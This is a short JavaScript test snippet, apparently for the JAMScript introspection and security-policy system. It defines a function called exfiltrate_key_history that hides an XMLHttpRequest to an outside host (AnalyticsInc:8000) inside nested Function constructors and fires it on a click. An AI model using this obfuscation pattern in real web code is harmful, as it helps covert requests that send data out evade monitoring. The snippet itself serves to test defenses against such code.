introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var nest = 'return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');';
  var v3 = Function(nest);
  var v0 = v3();
  var v1 = xmlhttp = new XMLHttpRequest;
  v0(v1);
  return
}
var v2 = document.getElementById("test");
v2.onclick = exfiltrate_key_history;

}
